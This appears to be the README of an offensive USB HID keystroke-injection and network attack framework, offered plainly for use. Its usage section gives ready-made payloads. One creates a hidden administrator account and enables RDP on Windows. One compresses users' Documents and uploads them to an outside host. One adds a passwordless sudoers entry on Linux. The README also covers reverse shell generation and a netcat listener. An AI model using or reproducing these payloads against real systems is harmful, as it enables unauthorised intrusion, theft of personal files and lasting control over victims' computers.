# Combined USB + Network Attack Framework

## Real Offensive Capabilities

### USB HID Attacks
- Keyboard emulation for command execution
- Terminal access on target systems
- Cross-platform support (Windows/Linux)

### Network Attacks
- Port scanning and service detection
- Reverse shell generation
- Payload obfuscation

### Combined Attacks
- Integrated USB + network attack scenarios
- Automated offensive operations
- Persistent access creation

## Setup Instructions

1. **Hardware Setup**:
   ```bash
   # Raspberry Pi Zero or other Linux device with USB OTG
   # Connect to target computer via USB
   ```

2. **Software Setup**:
   ```bash
   sudo ./setup.sh
   sudo python3 combined_attack_framework.py --help
   ```

3. **Verify Setup**:
   ```bash
   ls /dev/hidg0  # Should show USB HID device
   ```

## Usage Examples

### USB HID Attacks
```bash
# Type text via USB
sudo python3 combined_attack_framework.py usb type "Hello from USB attack"

# Execute command on Windows
sudo python3 combined_attack_framework.py usb exec "whoami" --platform windows

# Execute command on Linux
sudo python3 combined_attack_framework.py usb exec "id" --platform linux
```

### Network Attacks
```bash
# Port scan
sudo python3 combined_attack_framework.py net scan 192.168.1.1 1-1000

# Generate reverse shell
sudo python3 combined_attack_framework.py net shell 10.0.0.5 4444 --type powershell
```

### Combined Attacks
```bash
# Full combined attack
sudo python3 combined_attack_framework.py combined 192.168.1.100 10.0.0.5 4444
```

## Advanced Attack Scenarios

### 1. Persistent Access Creation
```bash
# Windows - Create admin user and enable RDP
sudo python3 combined_attack_framework.py usb exec "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add && reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f" --platform windows
```

### 2. Data Exfiltration
```bash
# Windows - Compress and exfiltrate documents
sudo python3 combined_attack_framework.py usb exec "powershell -c \"Compress-Archive -Path C:\\Users\\*\\Documents\\* -DestinationPath C:\\Temp\\docs.zip; (New-Object Net.WebClient).UploadFile('http://10.0.0.5/upload', 'C:\\Temp\\docs.zip')\"" --platform windows
```

### 3. Privilege Escalation
```bash
# Linux - Add user to sudoers
sudo python3 combined_attack_framework.py usb exec "echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" --platform linux
```

### 4. Full Attack Scenario
```bash
# Combined USB + Network attack
sudo python3 combined_attack_framework.py combined 192.168.1.100 10.0.0.5 4444
```

## Listener Setup

For reverse shells, set up a listener on your attack machine:
```bash
nc -lvnp 4444
```
